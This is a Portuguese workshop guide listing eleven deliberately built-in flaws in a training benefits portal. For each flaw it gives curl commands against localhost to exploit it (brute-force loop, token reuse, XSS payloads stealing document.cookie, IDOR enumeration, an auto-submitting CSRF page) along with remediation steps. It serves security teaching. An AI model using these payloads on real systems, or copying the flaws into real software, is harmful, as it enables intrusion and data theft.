# 🔐 Vulnerabilidades Intencionais - PBC

Este documento lista as vulnerabilidades intencionalmente implementadas no Portal de Benefícios do Colaborador para fins didáticos no workshop de QA + Segurança.

**⚠️ IMPORTANTE**: Este é um projeto educacional. Estas vulnerabilidades são propositais e servem para treinamento.

---

## 🎯 Pilares de Segurança

As vulnerabilidades estão organizadas por pilares de segurança, conforme metodologia do workshop.

---

## 🔑 Pilar: AUTENTICAÇÃO

### 1. Senhas Fracas Aceitas

**Categoria**: `autenticacao.senha_fraca`

**Descrição**: O sistema aceita senhas extremamente fracas sem nenhuma validação de complexidade.

**Como Explorar**:
```bash
# Registrar usuário com senha "123456"
curl -X POST http://localhost:8000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "nome": "Teste",
    "email": "teste@test.com",
    "username": "teste",
    "senha": "123456",
    "cpf": "000.000.000-00",
    "telefone": "(11) 99999-9999"
  }'
```

**Impacto**: Contas vulneráveis a ataques de força bruta e dicionário.

**Como Testar**:
- ✓ Registrar usuário com senha "123", "abc", "password"
- ✓ Verificar que não há erro ou validação
- ✓ Confirmar que é possível fazer login com essas senhas

**Remediação Esperada**:
- Implementar validação de complexidade (mínimo 8 caracteres, letras, números, caracteres especiais)
- Rejeitar senhas comuns
- Implementar política de senha forte

---

### 2. Mensagens de Erro Informativas

**Categoria**: `autenticacao.login`

**Descrição**: O endpoint de login revela se o usuário existe ou se a senha está incorreta.

**Como Explorar**:
```bash
# Usuário não existe
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "naoexiste", "senha": "123456"}'
# Resposta: "Usuário 'naoexiste' não encontrado"

# Senha incorreta
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "maria", "senha": "senhaerrada"}'
# Resposta: "Senha incorreta"
```

**Impacto**: Atacante pode enumerar usuários válidos do sistema.

**Como Testar**:
- ✓ Tentar login com usuário inexistente
- ✓ Tentar login com usuário válido e senha incorreta
- ✓ Comparar mensagens de erro
- ✓ Confirmar que é possível distinguir os casos

**Remediação Esperada**:
- Mensagem genérica: "Usuário ou senha incorretos"
- Mesma mensagem para ambos os casos

---

### 3. Sem Limite de Tentativas

**Categoria**: `autenticacao.brute_force`

**Descrição**: Não há rate limiting ou bloqueio após múltiplas tentativas de login falhas.

**Como Explorar**:
```bash
# Script de força bruta (exemplo educacional)
for i in {1..100}; do
  curl -X POST http://localhost:8000/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"maria\", \"senha\": \"tentativa$i\"}"
done
```

**Impacto**: Ataques de força bruta são viáveis.

**Como Testar**:
- ✓ Fazer 10-20 tentativas de login incorretas seguidas
- ✓ Verificar que não há bloqueio
- ✓ Confirmar que todas as tentativas foram processadas

**Remediação Esperada**:
- Implementar rate limiting (ex: 5 tentativas por minuto)
- Bloqueio temporário após N tentativas falhas
- CAPTCHA após X tentativas
- Log de tentativas suspeitas

---

## 🕐 Pilar: SESSÃO

### 4. Token com Expiração Longa

**Categoria**: `sessao.session_timeout`

**Descrição**: Tokens JWT expiram em 24 horas (1440 minutos), tempo muito longo para um sistema com dados sensíveis.

**Como Explorar**:
```bash
# Fazer login
TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "maria", "senha": "123456"}' | jq -r '.access_token')

# Token permanece válido por 24 horas
# Mesmo que o usuário "faça logout" no frontend
curl -X GET http://localhost:8000/api/auth/me \
  -H "Authorization: Bearer $TOKEN"
```

**Impacto**: Se token for roubado, atacante tem acesso por tempo prolongado.

**Como Testar**:
- ✓ Fazer login e salvar o token
- ✓ "Fazer logout" no frontend
- ✓ Usar o token antigo diretamente na API
- ✓ Confirmar que ainda funciona

**Remediação Esperada**:
- Reduzir expiração para 15-30 minutos
- Implementar refresh tokens
- Implementar blacklist de tokens
- Logout real no backend

---

### 5. Sem Revogação de Tokens

**Categoria**: `sessao.logout` e `sessao.reuse_token`

**Descrição**: Logout apenas remove token do cliente. O token continua válido no backend.

**Como Explorar**:
```bash
# 1. Login e salvar token
TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "maria", "senha": "123456"}' | jq -r '.access_token')

# 2. "Logout" no frontend (remove do localStorage)
# Mas o token ainda é válido

# 3. Reutilizar token diretamente
curl -X GET http://localhost:8000/api/users/me \
  -H "Authorization: Bearer $TOKEN"
# Ainda funciona!
```

**Impacto**: 
- Token pode ser reutilizado após logout
- Sessão não pode ser encerrada pelo servidor
- Vulnerável a roubo de token

**Como Testar**:
- ✓ Fazer login
- ✓ Copiar o token
- ✓ Fazer logout no frontend
- ✓ Usar o token copiado diretamente na API
- ✓ Confirmar que ainda está autenticado

**Remediação Esperada**:
- Endpoint `/api/auth/logout` que invalida o token
- Blacklist de tokens revogados
- Ou: Sessões com ID único no banco de dados

---

## 📝 Pilar: AUDITORIA

### 6. Logs Incompletos

**Categoria**: `auditoria.log_eventos_criticos`

**Descrição**: Nem todos os eventos críticos são logados adequadamente.

**Eventos NÃO logados**:
- ❌ Tentativas de login falhas
- ❌ Tentativas de acesso sem autorização (403)
- ❌ Tentativas de acesso sem autenticação (401)
- ❌ Alterações em dados bancários
- ❌ Logout
- ❌ Registro de novos usuários

**Eventos logados**:
- ✓ Login bem-sucedido (opcional no código)
- ✓ Atualização de dados pessoais
- ✓ Nova mensagem
- ✓ Mudança de papel

**Como Explorar**:
```bash
# Fazer várias tentativas de login falhas
curl -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "maria", "senha": "errada"}'

# Logar como Admin e verificar logs
TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "senha": "admin123"}' | jq -r '.access_token')

curl -X GET "http://localhost:8000/api/logs?event_type=LOGIN_FAILED" \
  -H "Authorization: Bearer $TOKEN"
# Não há eventos de login falho
```

**Impacto**: 
- Dificulta detecção de ataques
- Não há rastreabilidade de tentativas maliciosas
- Impossível auditar segurança

**Como Testar**:
- ✓ Fazer login com senha errada 5x
- ✓ Tentar acessar endpoint sem autenticação
- ✓ Tentar acessar endpoint sem permissão
- ✓ Verificar logs via `/api/logs`
- ✓ Confirmar ausência desses eventos

**Remediação Esperada**:
- Logar todas as tentativas de autenticação (sucesso e falha)
- Logar acessos negados (401, 403)
- Logar alterações em dados sensíveis
- Incluir IP, user agent, timestamp em todos os logs

---

## 🔧 Pilar: MANIPULAÇÃO

### 7. XSS em Mensagens

**Categoria**: `manipulacao.xss`

**Descrição**: Campos de texto (mensagens) não são sanitizados e podem executar scripts.

**Como Explorar**:
```bash
# Criar mensagem com script XSS
TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "maria", "senha": "123456"}' | jq -r '.access_token')

curl -X POST http://localhost:8000/api/messages \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "titulo": "Teste XSS",
    "conteudo": "<script>alert(\"XSS\")</script><img src=x onerror=alert(document.cookie)>"
  }'

# O script é salvo sem sanitização
# Se o frontend renderizar sem escape, o script executará
```

**Impacto**: 
- Execução de código JavaScript no navegador
- Roubo de tokens/cookies
- Phishing
- Defacement

**Como Testar**:
- ✓ Enviar mensagem com `<script>alert('XSS')</script>`
- ✓ Enviar mensagem com `<img src=x onerror=alert(1)>`
- ✓ Verificar que é salvo sem sanitização
- ✓ Se frontend renderizar sem escape, confirmar execução

**Remediação Esperada**:
- Sanitizar inputs no backend
- Escapar outputs no frontend
- Usar bibliotecas de sanitização (DOMPurify, bleach)
- Content Security Policy (CSP)

---

### 8. Exposição de Dados Sensíveis

**Categoria**: `manipulacao.exposicao_dados`

**Descrição**: API expõe dados sensíveis como CPF completo e dados bancários sem necessidade.

**Como Explorar**:
```bash
# Colaborador pode ver CPF completo de outros ao se registrar
# Gestores veem CPF completo e dados bancários de todos

TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "joao", "senha": "123456"}' | jq -r '.access_token')

curl -X GET http://localhost:8000/api/users \
  -H "Authorization: Bearer $TOKEN" | jq
# Resposta inclui CPF completo e dados bancários
```

**Impacto**: 
- Vazamento de informações pessoais
- Potencial uso para fraude
- Não conformidade com LGPD

**Como Testar**:
- ✓ Logar como Gestor RH
- ✓ Listar todos os usuários
- ✓ Verificar CPF completo e dados bancários na resposta
- ✓ Avaliar necessidade real desses dados

**Remediação Esperada**:
- Mascarar CPF (mostrar apenas: ***.***.789-**00)
- Ocultar/parcializar dados bancários
- Endpoint separado para dados sensíveis (com justificativa)
- Logs de acesso a dados sensíveis

---

### 9. Navegação Direta / IDOR

**Categoria**: `manipulacao.navegacao_direta`

**Descrição**: Embora haja controle de acesso por papel, IDs sequenciais facilitam enumeração.

**Como Explorar**:
```bash
# Como Gestor RH, pode iterar sobre todos os IDs
TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "joao", "senha": "123456"}' | jq -r '.access_token')

# Enumerar usuários
for id in {1..10}; do
  curl -s -X GET "http://localhost:8000/api/users/$id" \
    -H "Authorization: Bearer $TOKEN" | jq -r '.nome'
done
```

**Impacto**: 
- Enumeração facilitada
- Previsibilidade de IDs

**Como Testar**:
- ✓ Logar como Gestor RH
- ✓ Acessar `/api/users/1`, `/api/users/2`, etc.
- ✓ Confirmar que IDs são sequenciais
- ✓ Verificar facilidade de enumeração

**Remediação Esperada**:
- UUIDs ao invés de IDs sequenciais
- Ofuscação de IDs
- Rate limiting em enumeração
- Log de acessos suspeitos

---

### 10. CSRF

**Categoria**: `manipulacao.csrf`

**Descrição**: API não valida tokens CSRF, vulnerável a Cross-Site Request Forgery.

**Como Explorar**:
```html
<!-- Página maliciosa que faz requisição em nome do usuário autenticado -->
<html>
<body>
<form action="http://localhost:8000/api/users/me" method="POST" id="csrfForm">
  <input type="hidden" name="telefone" value="(11) 99999-9999">
</form>
<script>
  // Se usuário estiver autenticado, isso funciona
  document.getElementById('csrfForm').submit();
</script>
</body>
</html>
```

**Impacto**: 
- Ações não autorizadas em nome do usuário
- Alteração de dados
- Envio de mensagens

**Como Testar**:
- ✓ Criar página HTML maliciosa
- ✓ Usuário autenticado acessa a página
- ✓ Verificar se ação é executada sem confirmação

**Remediação Esperada**:
- Implementar tokens CSRF
- SameSite cookies
- Validar origin/referer

---

### 11. Validação Apenas no Cliente

**Categoria**: `manipulacao.validacao_cliente`

**Descrição**: Algumas validações podem existir apenas no frontend, permitindo burla via API direta.

**Como Explorar**:
```bash
# Exemplo: se frontend limita tamanho de telefone mas backend não valida

TOKEN=$(curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "maria", "senha": "123456"}' | jq -r '.access_token')

curl -X PUT http://localhost:8000/api/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "telefone": "123456789012345678901234567890"
  }'
# Se aceitar, validação só existe no frontend
```

**Impacto**: 
- Bypass de regras de negócio
- Dados inconsistentes
- Quebra de integridade

**Como Testar**:
- ✓ Identificar validações no frontend
- ✓ Tentar burlar via API direta
- ✓ Verificar se backend valida
- ✓ Confirmar se dados inválidos são aceitos

**Remediação Esperada**:
- Validações duplicadas no backend
- Backend é fonte da verdade
- Frontend apenas para UX

---

## 🧪 Checklist de Testes de Segurança

Use este checklist para avaliar cada vulnerabilidade:

### Autenticação
- [ ] Testar registro com senhas fracas
- [ ] Analisar mensagens de erro do login
- [ ] Tentar força bruta (10+ tentativas)
- [ ] Verificar política de senha

### Sessão
- [ ] Medir tempo de expiração do token
- [ ] Testar reutilização de token após logout
- [ ] Verificar se token pode ser revogado
- [ ] Testar sessões simultâneas

### Auditoria
- [ ] Verificar logs de login falho
- [ ] Verificar logs de acesso negado
- [ ] Verificar logs de alterações sensíveis
- [ ] Avaliar completude dos logs

### Manipulação
- [ ] Testar XSS em todos os campos de texto
- [ ] Verificar exposição de CPF completo
- [ ] Testar IDOR/navegação direta
- [ ] Verificar proteção CSRF
- [ ] Testar validação backend vs frontend
- [ ] Avaliar sanitização de inputs

### Autorização
- [ ] Testar acesso sem autenticação
- [ ] Testar acesso sem permissão
- [ ] Verificar RBAC em todos os endpoints
- [ ] Testar escalação de privilégios

---

## 📊 Matriz de Vulnerabilidades

| ID | Pilar | Tipo | Severidade | Facilidade de Exploração |
|----|-------|------|------------|--------------------------|
| 1 | Autenticação | Senha Fraca | Média | Fácil |
| 2 | Autenticação | Enumeração | Baixa | Fácil |
| 3 | Autenticação | Força Bruta | Alta | Fácil |
| 4 | Sessão | Timeout Longo | Média | Média |
| 5 | Sessão | Sem Revogação | Alta | Fácil |
| 6 | Auditoria | Logs Incompletos | Média | - |
| 7 | Manipulação | XSS | Alta | Média |
| 8 | Manipulação | Exposição de Dados | Alta | Fácil |
| 9 | Manipulação | IDOR | Baixa | Fácil |
| 10 | Manipulação | CSRF | Média | Média |
| 11 | Manipulação | Validação Cliente | Média | Fácil |

---

## 🎓 Objetivos do Workshop

### Para QAs
1. Identificar cada vulnerabilidade
2. Criar casos de teste para cada uma
3. Documentar evidências
4. Propor remediações
5. Classificar por pilar e tipo

### Para Desenvolvedores
1. Compreender impacto de cada vulnerabilidade
2. Aprender como corrigi-las
3. Implementar boas práticas de segurança
4. Pensar em segurança desde o design

---

## ⚠️ Disclaimer

**ATENÇÃO**: 

- Este sistema é INTENCIONALMENTE vulnerável
- Use APENAS para fins educacionais
- NÃO deploy em ambiente acessível publicamente
- NÃO use em produção
- NÃO coloque dados reais

As vulnerabilidades aqui descritas são para **aprendizado controlado** em ambiente de laboratório.

---

**Desenvolvido para Assert Consulting Labs - Workshop de QA + Segurança**

